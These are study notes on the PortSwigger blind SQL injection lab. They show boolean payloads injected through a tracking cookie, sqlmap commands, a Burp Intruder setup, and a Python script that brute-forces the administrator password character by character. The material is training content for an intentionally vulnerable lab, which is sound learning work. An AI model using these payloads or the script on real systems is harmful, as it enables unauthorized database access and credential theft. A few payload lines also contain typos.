# Blind SQL Injection Using Conditional Responses – Comprehensive Notes

**High-Level Summary:**  
These notes detail how to identify and exploit **_blind SQL injection_** vulnerabilities where no direct errors or query results are shown. Instead, attackers rely on subtle response differences (like the presence or absence of the **_“Welcome back”_** message) to infer whether their SQL queries evaluated to true or false. By systematically testing conditions, attackers can enumerate database contents (e.g., extracting the `administrator` user’s password) even without explicit feedback.

---

**Definition Table:**

| Term/Concept               | Definition/Explanation                                                                                                                                           |
|----------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **_Blind SQL Injection_**  | SQL injection with no visible error messages or query results. Attackers infer conditions via subtle page changes, timing, or content differences (e.g., "Welcome back"). |
| **_Boolean-Based Injection_** | A blind SQLi technique relying on true/false (boolean) conditions. Different responses indicate whether the injected condition evaluated to true or false. |
| **_SUBSTRING() Function_** | Extracts part of a string from a given position for a specified length. Useful for enumerating data one character at a time in SQL injection attacks.             |
| **_Welcome back Message_** | A specific indicator used in this lab. If a condition is true, the message "Welcome back" appears in the response, signaling the guess was correct.                |
| **_Burp Suite_**           | A comprehensive web testing suite (Proxy, Repeater, Intruder, Comparer) for intercepting requests, modifying parameters, and automating payload testing.          |
| **_Burp Repeater_**        | Allows manual request manipulation and re-sending. Perfect for step-by-step testing of SQL conditions.                                                            |
| **_Burp Intruder_**        | Automates testing multiple payloads. Ideal for brute-forcing password characters at scale.                                                                       |
| **_Burp Comparer_**        | Compares two responses side-by-side, highlighting differences to confirm subtle changes caused by payloads.                                                      |
| **_sqlmap_**               | Automated SQL injection tool. `--level` and `--risk` flags enable more aggressive tests (including cookies).                                                     |
| **_Content-Length_**       | The size of the HTTP response. Changes can indicate true/false conditions in blind SQLi.                                                                         |
| **_Payload_**              | The malicious string injected into a parameter to test for SQL injection.                                                                                       |
| **_Positional Markers_**   | Special markers in Intruder to define where payloads are inserted, enabling systematic testing of multiple values.                                                |

---

# PortSwigger Lab Description (Original Source)

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.  
>  
> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.  
>  
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.  
>  
> To solve the lab, log in as the `administrator` user.

---

# PortSwigger Official Solution (Summary)

- Intercept the `TrackingId` cookie and inject boolean conditions (`' AND '1'='1` and `' AND '1'='2`) to confirm blind SQLi.
- Confirm `users` table and `administrator` user existence.
- Determine the password length by incrementally checking `LENGTH(password)>X`.
- Extract the password one character at a time using `SUBSTRING()`, Burp Intruder, and the "Welcome back" indicator.
- Once the full password is obtained, log in as `administrator`.

---

# Instructor Lab Notes (Original) – Fully Detailed and Reformatted

> **Note:** These are the instructor’s original notes, now thoroughly explained and formatted for clarity. All original content is included. Additional commentary (*in italics*) is provided to explain the reasoning and tools used.

## Step 1: Initial Setup and Attempts

- We start by browsing the web application and clicking on a category (e.g., `Pets`) to generate requests. **Burp Suite** will intercept these requests so we can analyze them.

- We identify a key request:
  ```http
  GET /filter?category=Pets HTTP/2
  Host: ...
  Cookie: TrackingId=B4P068IYi5kg4oJQ; session=...
```

We send this request to **Intruder** to test for SQL injection by adding payloads to the `category` parameter.

## Step 2: Using Intruder with a Payload List

- We load a payload list from:
    
    ```
    /usr/share/seclists/SecLists-master/Fuzzing/SQLi/quick-SQLi.txt
    ```
    
- Running the Intruder attack on the `category` parameter returns responses shorter (~3000 bytes) than the original (~5000 bytes). Just seeing shorter responses is not proof of injection success. Although payloads appear in the response, no meaningful indicator (like "Welcome back") confirms a true/false condition.
    

**Why might this fail?**

- Different databases need different SQL syntax.
- The `category` parameter may not be vulnerable.

_Conclusion:_ Check other parameters or parts of the request, such as headers or cookies.

## Step 3: Switching to Manual Testing in Repeater

- We move the request to **Burp Repeater** to insert payloads manually and observe responses closely.
    
- For instance, we try:
    
    ```
    GET /filter?category=Pets' AND 1=1-- -
    ```
    
    After URL encoding:
    
    ```
    GET /filter?category=Pets'+AND+%3d11=1--+-
    ```
    
    The `Content-Length` changes from 5338 to 3754, which is unexpected. A successful boolean test (`1=1`) often keeps the layout similar or provides a clear indicator.
    

_Key Point:_  
The syntax may not match the database’s expectations, or `category` is not the right injection point.

## Step 4: Considering Other Injection Points

- The instructor suggests checking other request components like **User-Agent** or **Cookie** headers.
    
- We focus on the cookie:
    
    ```
    Cookie: TrackingId=B4P068IYi5kg4oJQ; session=...
    ```
    
    Add `test`:
    
    ```
    Cookie: TrackingId=B4P068IYi5kg4oJQtest; session=...
    ```
    
    Now we can replace `test` with payloads and try again.
    

## Step 5: Manual Testing the Cookie in Repeater

- Using Repeater, test a known true condition:
    
    ```
    ' AND 1='1;
    ```
    
    Send the response to **Burp Comparer**.
    
- Then test a false condition:
    
    ```
    ' AND 1='2;
    ```
    
    Send this response to Comparer as well.
    

**Why use Comparer?**  
Comparer highlights differences, showing how the application reacts to true vs. false conditions. If one response includes "Welcome back" and the other does not, we confirm a blind SQL injection condition.

- Indeed, `1='1` might yield "Welcome back" (and a certain Content-Length), while `1='2` does not.
    
- Without payload: Content-Length = 5338
    
- With `1='1`: Content-Length stays ~5338 and includes "Welcome back"
    
- With `1='2`: Content-Length ~5277 and no "Welcome back"
    

This confirms a working blind SQL injection in the cookie parameter.

## Step 6: Confirming SQL Injection and Using sqlmap

- We save the request as `req.txt` and run:
    
    ```
    sqlmap -r req.txt --level 2 --dbs
    ```
    

**Why `--level 2`?**  
`--level 2` instructs sqlmap to test more parameters, including cookies. If sqlmap says not injectable initially, don’t give up. We have manual proof it is injectable.

**Increasing Risk:** If sqlmap fails at default, try:

```
sqlmap -r req.txt --level 2 --risk 3 --dbs --batch
```

`--risk 3` means sqlmap uses more advanced, potentially noisier tests. `--batch` auto-answers prompts.

_Key Insight:_  
sqlmap doesn’t always succeed at default settings. Manual testing and adjusting `--level` and `--risk` help uncover tricky injections.

## Step 7: SUBSTRING and Extracting the Password

- The instructor explains `SUBSTRING()`:
    
    - `SUBSTRING('foobar',4,2)` → `ba`
    
    Different databases may use `SUBSTR()` or `SUBSTRING()`, but the principle is the same.
    
- Use `SUBSTRING()` to guess the password one character at a time:
    
    ```
    AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'
    ```
    
    If "Welcome back" appears, the character is `a`. If not, try `b`, then `c`, etc.
    
- This is slow manually. Use **Burp Intruder** to automate testing each character.
    

## Step 8: Using Burp Intruder for Automation

- Modify the cookie payload:
    
    ```
    Cookie: TrackingId=B4P068IYi5kg4oJQtest AND (SELECT SUBSTRING(password1,1,1) FROM users WHERE username='administrator')='a';
    ```
    
- Add positional markers around the number (`1`) and character (`a`) so Intruder can iterate over positions and character sets.
    
- Change Attack Type to **Cluster Bomb** to try multiple positions (1 to password length) and multiple characters (a-z0-9).
    
- Under **Payloads**:
    
    - Payload set 1: Numbers 1 to 30 (for substring positions)
    - Payload set 2: a-z, 0-9 (for characters)
- In **Settings → Grep - Match**, add `Welcome` to easily spot correct guesses.
    
- Start the attack. When a payload returns "Welcome back," that character is correct. Repeat for each position until the full password is found.
    

**Why Manual + Intruder?**  
sqlmap may fail or require tweaking. Manual checking (Repeater, Comparer) ensures a solid understanding, while Intruder automates brute-forcing large character sets.

## Step 9: Confirming the Full Password

- After brute-forcing each character, we recover the entire administrator password.
    
- Log in as `administrator` to complete the lab.
    

_Key Takeaway:_  
Manual verification and Burp Suite tools often succeed where automated tools alone struggle.

## Step 10: Scripting for Efficiency

- The instructor provides a Python script to automate guessing characters:

```python
import requests
import string

burp0_url = "https://0aae00dd03ee409a8f9135cf00a70092.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {"TrackingId": "aw52CZkptjzVQuMV", "session": "d2h6yEB6Mx16X51gnZHVeROH8cznKJMM"}
burp0_headers = {"Sec-Ch-Ua": "\"Not(A:Brand\";v=\"24\"", ...}

char_set = string.ascii_lowercase + string.digits
password = ''

for position in range(1, 21):
    for char in char_set:
        burp0_cookies["TrackingId"] = f"aw52CZkptjzVQuMV' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        print(f"Testing {position}:{char}")
        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        
        if "Welcome" in response.text:
            print(f"Found {position}:{char}")
            password += char
            break
print(f"Pass: {password}")
```

**How the Script Works:**

- **char_set**: Contains all possible characters (a-z, 0-9).
- **Nested Loops**:
    - Outer loop: `position` goes from 1 to 20 (or the known password length).
    - Inner loop: `char` tries each character in `char_set`.
- For each guess, the script updates `TrackingId` with an SQL injection payload that tests if the character at `position` equals `char`.
- It sends the request and checks if "Welcome" is in the response.
    - If yes, that’s the correct character. It appends to `password` and breaks to move to the next position.
- After completing all positions, it prints the full password.

**Why Scripting?**

- Scripting automates the entire guessing process.
- Once set up, it runs faster than manual methods or Intruder attacks.
- Ideal for long passwords or when you need a quick extraction method once the injection is confirmed.

---

# Exam Readiness & Actionable Methodology

## Methodology Workflow

1. **Recon**: Identify parameters (cookie, headers) if initial URL parameters fail.
2. **Boolean Checks**: `' AND '1'='1` vs `' AND '1'='2` to confirm blind SQLi.
3. **Exploitation**:
    - Confirm tables/users.
    - Determine password length (increment LENGTH checks).
    - Extract password via `SUBSTRING()` character-by-character.
4. **Automation**:
    - Use Intruder for brute forcing characters.
    - Script with Python/requests for rapid extraction.
5. **Post-Exploitation**: Log in as `administrator` to verify success.

## Troubleshooting Advice

- If sqlmap fails, increase `--risk`, `--level`, or try manual methods.
- Use Comparer to confirm subtle differences.
- Try different comment syntax for different DBMS.
- Always ensure the correct syntax for `SUBSTRING()` (or `SUBSTR()`) depending on DB type.

## Key Takeaways

- Blind SQLi uses subtle indicators rather than explicit errors.
- Manual testing + Burp tools often outshine default automation.
- Scripting offers a final automated approach once conditions are understood.

---

# What to Do Next (Exam Simulation)

- Practice binary search techniques (`>'a'` vs `='a'`) to speed guessing.
- Get familiar with sqlmap advanced flags and when to use them.
- Keep a personal cheat sheet of common payloads.
- Understand how to seamlessly switch between manual, Intruder, and scripting methods.

---

**_Areas Needing Further Clarification_**:

- DBMS-specific payloads and syntax differences.
- Advanced optimization techniques (binary search) for large datasets.

**_Further Research_**:

- Additional PortSwigger labs on advanced SQLi.
- sqlmap’s official documentation.
- Seclists for payload references.

---

# Relevant Hashtags

#BlindSQLInjection #SQLInjection #WebHacking #PortSwigger #BurpSuite #sqlmap #ExamPrep #SubstringFunction